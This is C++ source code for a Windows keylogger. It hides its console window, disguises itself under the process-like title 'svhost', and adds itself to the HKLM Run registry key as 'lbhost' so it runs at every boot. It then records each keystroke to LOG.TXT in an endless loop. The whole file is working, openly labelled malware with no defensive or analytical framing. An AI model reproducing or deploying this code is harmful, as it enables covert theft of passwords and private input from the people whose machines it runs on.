#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>

void Hideme();
void Logthis(int button, char* file);

int main(int argc, char** argv) {
	Hideme();
	char filename[] = "LOG.TXT";

	std::string reg = "\"" + std::string(argv[0]) + "\" \"" + std::string(argv[1]) + "\" \"" + std::string(argv[2]) + "\"";
	//Register the keylogger application into windows Registery
	HKEY hKey;
	RegCreateKeyEx(
		/*hKey*/        HKEY_LOCAL_MACHINE,
		/*lpSubKey*/    "SOFTWARE\\Microsoft\\Windows\\"
		"CurrentVersion\\Run",
		/*Reserved*/    0,
		/*lpClass*/     NULL,
		/*dwOptions*/   REG_OPTION_NON_VOLATILE,
		/*samDesired */ KEY_ALL_ACCESS,
		/*lpSecurityAttributes*/ NULL,
		/*phkResult */  &hKey,
		/*lpdwDisposition */ 0);
	RegSetValueExA(
		hKey,
		"lbhost",
		0,
		REG_SZ,
		(LPBYTE)reg.c_str(),
		reg.length() + 1);

	RegCloseKey(hKey);

	char key;
	while (true) {
		for (int i = 8; i < 190; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Logthis(i, filename);
			}
		}
		Sleep(50);
	}
}

void Hideme() {
	SetConsoleTitle("svhost");
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

void Logthis(int button, char* filename) { 
	if (button == 1 || button == 2)
		return; //Left and right click
	FILE *file = fopen(filename, "a+");

	if (button == 8)
		fprintf(file, "%s", "[BACKSPACE]");
	else if (button == 13)
		fprintf(file, "%s", "[ENTER]");
	else if (button == 32)
		fprintf(file, "%s", " ");
	else if (button == VK_TAB)
		fprintf(file, "%s", "[TAB]");
	else if (button == VK_SHIFT)
		fprintf(file, "%s", "[SHIFT]");
	else if (button == VK_CONTROL)
		fprintf(file, "%s", "[CONTROL]");
	else if (button == VK_ESCAPE)
		fprintf(file, "%s", "[ESCAPE]");
	else if (button == VK_END)
		fprintf(file, "%s", "[END]");
	else if (button == VK_HOME)
		fprintf(file, "%s", "[HOME]");
	else if (button == VK_LEFT)
		fprintf(file, "%s", "[LEFT]");
	else if (button == VK_RIGHT)
		fprintf(file, "%s", "[RIGHT]");
	else if (button == VK_UP)
		fprintf(file, "%s", "[UP]");
	else if (button == VK_DOWN)
		fprintf(file, "%s", "[DOWN]");
	else if (button == 190 || button == 110)
		fprintf(file, "%s", ".");
	else
		fprintf(file, "%s", &button);


	fclose(file);
}